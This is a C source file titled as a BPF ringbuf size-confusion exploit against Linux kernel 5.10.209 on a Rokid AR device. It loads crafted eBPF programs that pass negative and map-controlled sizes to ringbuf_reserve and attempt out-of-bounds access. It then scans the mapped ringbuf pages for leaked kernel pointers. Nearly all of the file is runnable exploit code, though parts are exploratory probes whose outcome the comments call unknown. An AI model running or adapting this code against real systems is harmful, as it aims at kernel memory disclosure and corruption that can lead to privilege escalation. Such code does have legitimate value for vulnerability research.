/*
 * BPF Ringbuf Size Confusion Exploit
 * Target: Kernel 5.10.209 Rokid AR
 *
 * DISCOVERY: size=-1 (0xFFFFFFFF) passes verifier!
 * This might cause:
 * 1. Integer overflow in ringbuf_reserve
 * 2. Huge allocation allowing OOB access
 * 3. Confusion in mem_size tracking
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <sys/syscall.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <linux/bpf.h>

#define BPF_ALU64_IMM(OP, DST, IMM) \
    ((struct bpf_insn){.code = BPF_ALU64 | BPF_OP(OP) | BPF_K, .dst_reg = DST, .src_reg = 0, .off = 0, .imm = IMM})
#define BPF_ALU64_REG(OP, DST, SRC) \
    ((struct bpf_insn){.code = BPF_ALU64 | BPF_OP(OP) | BPF_X, .dst_reg = DST, .src_reg = SRC, .off = 0, .imm = 0})
#define BPF_MOV64_REG(DST, SRC) \
    ((struct bpf_insn){.code = BPF_ALU64 | BPF_MOV | BPF_X, .dst_reg = DST, .src_reg = SRC, .off = 0, .imm = 0})
#define BPF_MOV64_IMM(DST, IMM) \
    ((struct bpf_insn){.code = BPF_ALU64 | BPF_MOV | BPF_K, .dst_reg = DST, .src_reg = 0, .off = 0, .imm = IMM})
#define BPF_MOV32_IMM(DST, IMM) \
    ((struct bpf_insn){.code = BPF_ALU | BPF_MOV | BPF_K, .dst_reg = DST, .src_reg = 0, .off = 0, .imm = IMM})
#define BPF_LD_MAP_FD(DST, FD)                                                                                 \
    ((struct bpf_insn){.code = BPF_LD | BPF_DW | BPF_IMM, .dst_reg = DST, .src_reg = 1, .off = 0, .imm = FD}), \
        ((struct bpf_insn){.code = 0, .dst_reg = 0, .src_reg = 0, .off = 0, .imm = 0})
#define BPF_JMP_IMM(OP, DST, IMM, OFF) \
    ((struct bpf_insn){.code = BPF_JMP | BPF_OP(OP) | BPF_K, .dst_reg = DST, .src_reg = 0, .off = OFF, .imm = IMM})
#define BPF_STX_MEM(SZ, DST, SRC, OFF) \
    ((struct bpf_insn){.code = BPF_STX | BPF_SIZE(SZ) | BPF_MEM, .dst_reg = DST, .src_reg = SRC, .off = OFF, .imm = 0})
#define BPF_LDX_MEM(SZ, DST, SRC, OFF) \
    ((struct bpf_insn){.code = BPF_LDX | BPF_SIZE(SZ) | BPF_MEM, .dst_reg = DST, .src_reg = SRC, .off = OFF, .imm = 0})
#define BPF_RAW_INSN(CODE, DST, SRC, OFF, IMM) \
    ((struct bpf_insn){.code = CODE, .dst_reg = DST, .src_reg = SRC, .off = OFF, .imm = IMM})
#define BPF_EXIT_INSN() \
    ((struct bpf_insn){.code = BPF_JMP | BPF_EXIT})
#define BPF_ST_MEM(SZ, DST, OFF, IMM) \
    ((struct bpf_insn){.code = BPF_ST | BPF_SIZE(SZ) | BPF_MEM, .dst_reg = DST, .src_reg = 0, .off = OFF, .imm = IMM})

#define BPF_SIZE(code) ((code) & 0x18)
#define BPF_FUNC_ringbuf_reserve 131
#define BPF_FUNC_ringbuf_submit 132
#define BPF_FUNC_ringbuf_discard 133
#define BPF_FUNC_ringbuf_query 134

static char log_buf[65536];

int bpf_syscall(int cmd, union bpf_attr *attr, unsigned int size)
{
    return syscall(__NR_bpf, cmd, attr, size);
}

int create_ringbuf(int max_entries)
{
    union bpf_attr attr = {0};
    attr.map_type = BPF_MAP_TYPE_RINGBUF;
    attr.max_entries = max_entries;
    return bpf_syscall(BPF_MAP_CREATE, &attr, sizeof(attr));
}

int load_bpf_prog_verbose(struct bpf_insn *insns, int insn_cnt, const char *name)
{
    memset(log_buf, 0, sizeof(log_buf));
    union bpf_attr attr = {0};
    attr.prog_type = BPF_PROG_TYPE_SOCKET_FILTER;
    attr.insns = (unsigned long)insns;
    attr.insn_cnt = insn_cnt;
    attr.license = (unsigned long)"GPL";
    attr.log_buf = (unsigned long)log_buf;
    attr.log_size = sizeof(log_buf);
    attr.log_level = 2; /* More verbose */

    int fd = bpf_syscall(BPF_PROG_LOAD, &attr, sizeof(attr));
    printf("[%s] %s (fd=%d errno=%d)\n", name, fd >= 0 ? "SUCCESS" : "FAILED", fd, errno);
    if (strlen(log_buf) > 0)
    {
        printf("Verifier Log:\n%s\n", log_buf);
    }
    return fd;
}

int load_bpf_prog(struct bpf_insn *insns, int insn_cnt)
{
    memset(log_buf, 0, sizeof(log_buf));
    union bpf_attr attr = {0};
    attr.prog_type = BPF_PROG_TYPE_SOCKET_FILTER;
    attr.insns = (unsigned long)insns;
    attr.insn_cnt = insn_cnt;
    attr.license = (unsigned long)"GPL";
    attr.log_buf = (unsigned long)log_buf;
    attr.log_size = sizeof(log_buf);
    attr.log_level = 1;

    return bpf_syscall(BPF_PROG_LOAD, &attr, sizeof(attr));
}

void trigger_bpf_prog(int prog_fd)
{
    int socks[2];
    if (socketpair(AF_UNIX, SOCK_DGRAM, 0, socks) < 0)
        return;

    int flags = fcntl(socks[0], F_GETFL, 0);
    fcntl(socks[0], F_SETFL, flags | O_NONBLOCK);
    fcntl(socks[1], F_SETFL, flags | O_NONBLOCK);

    if (setsockopt(socks[0], SOL_SOCKET, SO_ATTACH_BPF, &prog_fd, sizeof(prog_fd)) < 0)
    {
        close(socks[0]);
        close(socks[1]);
        return;
    }

    char buf[64] = "trigger";
    write(socks[1], buf, sizeof(buf));
    read(socks[0], buf, sizeof(buf));

    close(socks[0]);
    close(socks[1]);
}

void hexdump(const char *desc, void *addr, int len)
{
    unsigned char *p = (unsigned char *)addr;
    printf("%s:\n", desc);
    for (int i = 0; i < len; i += 16)
    {
        printf("  %04x: ", i);
        for (int j = 0; j < 16 && i + j < len; j++)
            printf("%02x ", p[i + j]);
        printf("\n");
    }
}

void scan_for_kernel_ptrs(unsigned long *buf, int count)
{
    int found = 0;
    for (int i = 0; i < count; i++)
    {
        unsigned long val = buf[i];
        if (val == 0)
            continue;
        if ((val >> 40) == 0xffffff)
        {
            printf("  [offset %d] KERNEL PTR: 0x%016lx\n", i * 8, val);
            found++;
        }
    }
    if (found == 0)
        printf("  No kernel pointers found\n");
}

/*
 * Test: What happens when we request size=-1 (0xFFFFFFFF)?
 * The verifier allows it, but runtime behavior is unknown.
 */
void test_size_negative_one(int rb_fd)
{
    printf("\n=== Test: size=-1 Runtime Behavior ===\n");

    struct bpf_insn prog[] = {
        BPF_LD_MAP_FD(BPF_REG_1, rb_fd),                                     /* 0-1 */
        BPF_MOV64_IMM(BPF_REG_2, -1),                                        /* 2: size = 0xFFFFFFFFFFFFFFFF */
        BPF_MOV64_IMM(BPF_REG_3, 0),                                         /* 3 */
        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_ringbuf_reserve), /* 4 */

        /* Store r0 (ptr or NULL) somewhere we can read */
        /* If reserve succeeds with huge size, this is a bug */
        BPF_JMP_IMM(BPF_JEQ, BPF_REG_0, 0, 5), /* 5: if NULL, skip */

        /* Write marker at offset 0 */
        BPF_MOV64_REG(BPF_REG_7, BPF_REG_0),          /* 6 */
        BPF_ST_MEM(BPF_DW, BPF_REG_7, 0, 0xDEADBEEF), /* 7 */

        BPF_MOV64_REG(BPF_REG_1, BPF_REG_0),                                 /* 8 */
        BPF_MOV64_IMM(BPF_REG_2, 1),                                         /* 9: discard */
        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_ringbuf_discard), /* 10 */

        BPF_MOV64_IMM(BPF_REG_0, 0), /* 11 */
        BPF_EXIT_INSN(),             /* 12 */
    };

    int prog_fd = load_bpf_prog_verbose(prog, sizeof(prog) / sizeof(prog[0]), "Size_-1");
    if (prog_fd < 0)
        return;

    printf("Program loaded, triggering...\n");
    trigger_bpf_prog(prog_fd);
    printf("Trigger complete (if no crash, reserve likely returned NULL)\n");
    close(prog_fd);
}

/*
 * Test: Use 32-bit signed value that's negative
 * MOV32 with -1 gives 0xFFFFFFFF in lower 32 bits
 */
void test_mov32_size(int rb_fd)
{
    printf("\n=== Test: MOV32 size=-1 ===\n");

    struct bpf_insn prog[] = {
        BPF_LD_MAP_FD(BPF_REG_1, rb_fd),                                     /* 0-1 */
        BPF_MOV32_IMM(BPF_REG_2, -1),                                        /* 2: r2 = 0x00000000FFFFFFFF */
        BPF_MOV64_IMM(BPF_REG_3, 0),                                         /* 3 */
        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_ringbuf_reserve), /* 4 */

        BPF_JMP_IMM(BPF_JEQ, BPF_REG_0, 0, 5), /* 5 */

        BPF_MOV64_REG(BPF_REG_7, BPF_REG_0),          /* 6 */
        BPF_ST_MEM(BPF_DW, BPF_REG_7, 0, 0xCAFE0001), /* 7 */

        BPF_MOV64_REG(BPF_REG_1, BPF_REG_0),                                 /* 8 */
        BPF_MOV64_IMM(BPF_REG_2, 1),                                         /* 9 */
        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_ringbuf_discard), /* 10 */

        BPF_MOV64_IMM(BPF_REG_0, 0), /* 11 */
        BPF_EXIT_INSN(),             /* 12 */
    };

    int prog_fd = load_bpf_prog_verbose(prog, sizeof(prog) / sizeof(prog[0]), "MOV32_-1");
    if (prog_fd < 0)
        return;

    printf("Program loaded, triggering...\n");
    trigger_bpf_prog(prog_fd);
    printf("Trigger complete\n");
    close(prog_fd);
}

/*
 * Test: Try to confuse verifier with size from scalar
 */
void test_scalar_size(int rb_fd)
{
    printf("\n=== Test: Scalar Size Control ===\n");

    /* Create array map to hold controllable scalar */
    union bpf_attr attr = {0};
    attr.map_type = BPF_MAP_TYPE_ARRAY;
    attr.key_size = 4;
    attr.value_size = 8;
    attr.max_entries = 1;
    int arr_fd = bpf_syscall(BPF_MAP_CREATE, &attr, sizeof(attr));
    if (arr_fd < 0)
    {
        printf("Failed to create array\n");
        return;
    }

    /* Put a large value in the array */
    int key = 0;
    unsigned long val = 0x1000; /* 4096 */
    memset(&attr, 0, sizeof(attr));
    attr.map_fd = arr_fd;
    attr.key = (unsigned long)&key;
    attr.value = (unsigned long)&val;
    bpf_syscall(BPF_MAP_UPDATE_ELEM, &attr, sizeof(attr));

    struct bpf_insn prog[] = {
        /* Lookup from map */
        BPF_LD_MAP_FD(BPF_REG_1, arr_fd),             /* 0-1 */
        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),         /* 2 */
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -8),        /* 3 */
        BPF_ST_MEM(BPF_W, BPF_REG_10, -8, 0),         /* 4 */
        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, 1), /* 5: map_lookup */

        BPF_JMP_IMM(BPF_JEQ, BPF_REG_0, 0, 16), /* 6: null check */

        /* r6 = *map_value (user controlled!) */
        BPF_LDX_MEM(BPF_DW, BPF_REG_6, BPF_REG_0, 0), /* 7 */

        /* Use r6 as size for ringbuf_reserve */
        BPF_LD_MAP_FD(BPF_REG_1, rb_fd),                                     /* 8-9 */
        BPF_MOV64_REG(BPF_REG_2, BPF_REG_6),                                 /* 10: size from scalar! */
        BPF_MOV64_IMM(BPF_REG_3, 0),                                         /* 11 */
        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_ringbuf_reserve), /* 12 */

        BPF_JMP_IMM(BPF_JEQ, BPF_REG_0, 0, 6), /* 13 */

        /* If success, verifier thinks size is UNKNOWN */
        /* Can we now access at large offset? */
        BPF_MOV64_REG(BPF_REG_7, BPF_REG_0),            /* 14 */
        BPF_LDX_MEM(BPF_DW, BPF_REG_8, BPF_REG_7, 256), /* 15: access at offset 256 */
        BPF_STX_MEM(BPF_DW, BPF_REG_7, BPF_REG_8, 0),   /* 16: write to ringbuf */

        BPF_MOV64_REG(BPF_REG_1, BPF_REG_0),                                /* 17 */
        BPF_MOV64_IMM(BPF_REG_2, 0),                                        /* 18 */
        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_ringbuf_submit), /* 19 */

        BPF_MOV64_IMM(BPF_REG_0, 0), /* 20 */
        BPF_EXIT_INSN(),             /* 21 */
        BPF_EXIT_INSN(),             /* 22: null path */
        BPF_EXIT_INSN(),             /* 23: null path 2 */
    };

    int prog_fd = load_bpf_prog_verbose(prog, sizeof(prog) / sizeof(prog[0]), "ScalarSize");

    if (prog_fd >= 0)
    {
        printf("!!! SCALAR SIZE ACCEPTED !!!\n");
        printf("Triggering program...\n");
        trigger_bpf_prog(prog_fd);

        /* Check data page for leaked data */
        void *data = mmap(NULL, 4096, PROT_READ, MAP_SHARED, rb_fd, 8192);
        if (data != MAP_FAILED)
        {
            printf("Checking data page for leaks:\n");
            hexdump("First 128 bytes", data, 128);
            scan_for_kernel_ptrs((unsigned long *)data, 64);
            munmap(data, 4096);
        }

        close(prog_fd);
    }

    close(arr_fd);
}

/*
 * Test: Read ringbuf pages before and after operations
 * to catch any residual kernel data
 */
void test_ringbuf_page_contents(int rb_fd)
{
    printf("\n=== Test: Ringbuf Page Contents ===\n");

    /* Write many entries to populate ringbuf */
    struct bpf_insn prog[] = {
        BPF_LD_MAP_FD(BPF_REG_1, rb_fd),
        BPF_MOV64_IMM(BPF_REG_2, 128),
        BPF_MOV64_IMM(BPF_REG_3, 0),
        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_ringbuf_reserve),

        BPF_JMP_IMM(BPF_JEQ, BPF_REG_0, 0, 5),

        /* Write markers */
        BPF_MOV64_REG(BPF_REG_7, BPF_REG_0),
        BPF_ST_MEM(BPF_DW, BPF_REG_7, 0, 0x4141414141414141),
        BPF_ST_MEM(BPF_DW, BPF_REG_7, 8, 0x4242424242424242),

        BPF_MOV64_REG(BPF_REG_1, BPF_REG_0),
        BPF_MOV64_IMM(BPF_REG_2, 0),
        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_ringbuf_submit),

        BPF_MOV64_IMM(BPF_REG_0, 0),
        BPF_EXIT_INSN(),
    };

    int prog_fd = load_bpf_prog(prog, sizeof(prog) / sizeof(prog[0]));
    if (prog_fd < 0)
    {
        printf("Failed to load program\n");
        return;
    }

    /* Trigger multiple times */
    printf("Triggering 10 times...\n");
    for (int i = 0; i < 10; i++)
    {
        trigger_bpf_prog(prog_fd);
    }

    /* Now read all pages and look for interesting data */
    printf("\nReading all ringbuf pages:\n");

    /* Data pages (multiple pages for larger ringbuf) */
    for (int page = 0; page < 4; page++)
    {
        void *data = mmap(NULL, 4096, PROT_READ, MAP_SHARED, rb_fd, 8192 + page * 4096);
        if (data != MAP_FAILED)
        {
            printf("\n--- Data page %d ---\n", page);

            /* Look for our markers and anything else */
            unsigned long *ptr = (unsigned long *)data;
            for (int i = 0; i < 512; i++)
            {
                unsigned long val = ptr[i];
                if (val == 0)
                    continue;

                /* Our markers */
                if (val == 0x4141414141414141 || val == 0x4242424242424242)
                {
                    printf("  [%03d] Our marker: 0x%016lx\n", i * 8, val);
                }
                /* Potential kernel pointers */
                else if ((val >> 40) == 0xffffff)
                {
                    printf("  [%03d] KERNEL PTR: 0x%016lx\n", i * 8, val);
                }
                /* Ringbuf header pattern */
                else if ((val & 0xFFFFFFFF) < 0x1000)
                {
                    printf("  [%03d] Possible hdr: 0x%016lx\n", i * 8, val);
                }
            }

            munmap(data, 4096);
        }
    }

    close(prog_fd);
}

/*
 * Test: Check ringbuf entry header layout
 */
void test_header_layout(int rb_fd)
{
    printf("\n=== Test: Entry Header Layout ===\n");

    struct bpf_insn prog[] = {
        BPF_LD_MAP_FD(BPF_REG_1, rb_fd),
        BPF_MOV64_IMM(BPF_REG_2, 32), /* Small size */
        BPF_MOV64_IMM(BPF_REG_3, 0),
        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_ringbuf_reserve),

        BPF_JMP_IMM(BPF_JEQ, BPF_REG_0, 0, 5),

        /* Write known pattern */
        BPF_MOV64_REG(BPF_REG_7, BPF_REG_0),
        BPF_ST_MEM(BPF_DW, BPF_REG_7, 0, 0xDEADC0DE),
        BPF_ST_MEM(BPF_DW, BPF_REG_7, 8, 0xBEEFCAFE),

        BPF_MOV64_REG(BPF_REG_1, BPF_REG_0),
        BPF_MOV64_IMM(BPF_REG_2, 0),
        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_ringbuf_submit),

        BPF_MOV64_IMM(BPF_REG_0, 0),
        BPF_EXIT_INSN(),
    };

    int prog_fd = load_bpf_prog(prog, sizeof(prog) / sizeof(prog[0]));
    if (prog_fd < 0)
        return;

    trigger_bpf_prog(prog_fd);

    /* Read data page and analyze header */
    void *data = mmap(NULL, 4096, PROT_READ, MAP_SHARED, rb_fd, 8192);
    if (data != MAP_FAILED)
    {
        printf("Data page raw dump:\n");
        hexdump("First 64 bytes", data, 64);

        /*
         * BPF ringbuf entry header (before user data):
         * struct bpf_ringbuf_hdr {
         *     u32 len;      // size | BPF_RINGBUF_BUSY_BIT | BPF_RINGBUF_DISCARD_BIT
         *     u32 pg_off;   // page offset
         * };
         *
         * User data follows at +8
         */
        unsigned int *hdr = (unsigned int *)data;
        printf("\nHeader analysis:\n");
        printf("  len/flags = 0x%08x\n", hdr[0]);
        printf("  pg_off    = 0x%08x\n", hdr[1]);
        printf("  user[0]   = 0x%08x\n", hdr[2]);
        printf("  user[1]   = 0x%08x\n", hdr[3]);

        munmap(data, 4096);
    }

    close(prog_fd);
}

int main(void)
{
    setbuf(stdout, NULL);
    setbuf(stderr, NULL);

    printf("===========================================\n");
    printf("BPF Ringbuf Size Confusion Exploit\n");
    printf("Target: Kernel 5.10.209 Rokid AR\n");
    printf("===========================================\n");

    /* Create large ringbuf */
    int rb_fd = create_ringbuf(4096 * 64); /* 256KB */
    if (rb_fd < 0)
    {
        printf("Failed to create ringbuf: %d\n", errno);
        return 1;
    }
    printf("Ringbuf fd=%d\n", rb_fd);

    /* Run tests */
    test_size_negative_one(rb_fd);
    test_mov32_size(rb_fd);
    test_scalar_size(rb_fd);
    test_ringbuf_page_contents(rb_fd);
    test_header_layout(rb_fd);

    close(rb_fd);

    printf("\n===========================================\n");
    printf("Complete\n");
    printf("===========================================\n");

    return 0;
}
